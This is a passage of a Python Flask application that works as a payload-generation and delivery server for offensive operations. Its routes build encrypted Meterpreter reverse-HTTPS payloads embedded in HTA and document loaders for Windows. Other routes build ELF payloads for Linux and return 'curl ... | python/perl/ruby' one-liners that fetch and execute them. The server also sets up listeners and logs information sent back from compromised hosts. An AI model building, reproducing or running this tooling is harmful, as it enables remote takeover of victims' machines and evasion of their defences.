        download_name=f'{id}.doc',
        mimetype='application/octet-stream'
    )


@win.route('/hta/get', methods=['POST'])
def hta_get():
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    proxy = ('system_proxy' in request.form.keys())
    id = filter_string(request.form['id'])
    
    if id == "":
        return "Invalid id", 400

    payloads_generated = gen_multiple_payloads(
        lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]
    )

    payload_x32 = base64.b64encode(
        encrypt_raw_payload(payloads_generated[32])
    ).decode()
    payload_x64 = base64.b64encode(
        encrypt_raw_payload(payloads_generated[64])
    ).decode()

    hta = render_template(
        "loader.hta",
        payload_x64=payload_x64,
        payload_x32=payload_x32
    )

    bytes_data = hta.encode('utf-8')
    bytes_io = BytesIO(bytes_data)
    bytes_io.seek(0)

    return send_file(
        bytes_io,
        as_attachment=False,
        download_name=f"{id}.hta".strip(),
        mimetype='application/octet-stream'
    )


@lin.route('/')
def lin_form():
    import os
    template = render_template('1_lin_form.html')
    ladapter = request.args.get('ladapter', '')
    lport = request.args.get('lport', 443)
    uid = request.args.get('uid', os.popen("uuidgen | sed 's/-//g'").read())
    print(f"{ladapter=}")
    print(f"{lport=}")
    print(f"{uid=}")
    template = template.replace(
        'name="lhost" value=""', f'name="lhost" value="{get_ip(ladapter)}"')
    template = template.replace(
        'name="lport" value=""', f'name="lport" value="{str(lport)}"')
    template = template.replace(
        'name="id" value=""', f'name="id" value="{str(uid)}"')
    return template


def gen_multiple_payloads_linux(lhost, lport, id, config="linux_meterpreter_reverse_https", endpoint="ms", arch=64):
    setup_listener(
        lhost,
        lport,
        LISTENER_CONFIGS[config][arch] | {
            "LURI": f"/ms/{id}/"
        }
    )

    return generate_payload(
        LISTENER_CONFIGS[config][arch]["Payload"],
        lhost,
        lport,
        'elf',
        [
            {
                "LURI": f"/ms/{id}/",
                "PrependFork": "true"
            }
        ]
    )


def generate_elf_internal(lhost, lport, id):
    payloads_generated = gen_multiple_payloads_linux(
        lhost, lport, id
    )
    return payloads_generated


@lin.route('elf/get', methods=['POST'])
def generate_elf():
    lhost = request.form.get("lhost", "").strip()
    lport = request.form.get("lport", "").strip()
    id = filter_string(request.form.get("id", "").strip())

    if not lhost or not lport or not id:
        return "Missing parameters", 400
    return send_from_directory(
        directory=PAYLOAD_DIR,
        path=generate_elf_internal(lhost, lport, id),
        as_attachment=True,
        download_name=f'{id}.elf'
    )


@lin.route('elf_fee/get', methods=['POST'])
def generate_elf_fee():
    lhost = request.form.get("lhost", "").strip()
    lport = request.form.get("lport", "").strip()
    id = filter_string(request.form.get("id", "").strip())
    scripting_language = request.form.get("scripting_language", "").strip()
    if not lhost or not lport or not id:
        return "Missing parameters", 400

    print(f"{scripting_language=}")
    if scripting_language not in ['pl', 'py', 'rb']:
        return f"{scripting_language not in ['pl', 'py', 'rb'] =}", 400

    bin_loc = generate_elf_internal(lhost, lport, id)
    command = f"fee {PAYLOAD_DIR}/{bin_loc} -l {scripting_language} | tee {PAYLOAD_DIR}/{bin_loc}.{scripting_language}.bin"
    with os.popen(command) as f:
        fee_output = f.read()
    url = "curl http://{{ lhost }}:{{ lport }}/"
    if scripting_language == "pl":
        pipe_to = "perl"
    if scripting_language == "rb":
        pipe_to = "ruby"
    if scripting_language == "py":
        return render_template_string(
            url +
            f"{bin_loc}.{scripting_language}.bin | python</br>" + url +
            f"{bin_loc}.{scripting_language}.bin | python3",
            lhost=lhost,
            lport=lport,
        ).strip()

    return render_template_string(
        url +
        f"{bin_loc}.{scripting_language}.bin | {pipe_to}",
        lhost=lhost,
        lport=lport,
    ).strip()


@info.route('/', methods=['GET', 'POST'])
def receive_info():
    if request.form:
        current_app.logger.info(f"Received info: {request.form}")

    return "Thanks", 200


@crypt.route('/aes/get', methods=['GET', 'POST'])
def aes_payload():
    password = request.args.get('password')
    string_to_encrypt = request.args.get('string_to_encrypt', '')
    lhost = request.args.get('lhost')
    lport = request.args.get('lport', "443")
    payload_type = request.args.get('payload_type', "443")
    architecture = int(request.args.get('architecture', 64))
    id = request.args.get('id')
    proxy = ('system_proxy' in request.form.keys()
             or 'system_proxy' in request.args.keys())

    if not all([password, lhost, lport, id]):
        return "?password=some-password&lport=443&lhost=tun0&architecture=64&id=test&(optional string_to_encrypt=Hello World)&(optional proxy)", 400

    if string_to_encrypt != '':
        encrypted_blob = openssl_pbkdf2_encrypt(
            string_to_encrypt.encode('latin-1'), password)
        return encrypted_blob
    else:
        encrypted_blob = generate_encrypted_payload(
            id=id,
            lhost=lhost,
            lport=int(lport),
            password=password,
            arch=architecture,
            proxy=proxy
        )
        return encrypted_blob



app = Flask(__name__)
app.register_blueprint(win, url_prefix='/p/win')
app.register_blueprint(lin, url_prefix='/p/lin')
app.register_blueprint(info, url_prefix='/p/info')
app.register_blueprint(crypt, url_prefix='/p/crypt')

print(app.url_map)

if __name__ == '__main__':
    import os
    import uuid
    import subprocess

    cert_dir = './certs'
    key_path = os.path.join(cert_dir, 'cert.key')
    crt_path = os.path.join(cert_dir, 'cert.crt')

    if not os.path.exists(key_path):
        os.makedirs(cert_dir, exist_ok=True)
        cn = f"cert-{uuid.uuid4().hex}"
        cmd = [
            "openssl", "req", "-x509",
            "-newkey", "rsa:2048",
            "-keyout", key_path,
            "-out", crt_path,
            "-days", "365",
            "-nodes",
            "-subj", f"/CN={cn}"
        ]
        subprocess.run(cmd, check=True)
    print("Don't forget to run nginx:")
    print("*" * 50)
    print("sudo pkill nginx ; sudo nginx -c /opt/loader/nginx2.conf")
    print("*" * 50)
    app.run(host='127.0.0.1', port=50101, debug=True)
    password = str(uuid.uuid4()).replace('-', '')
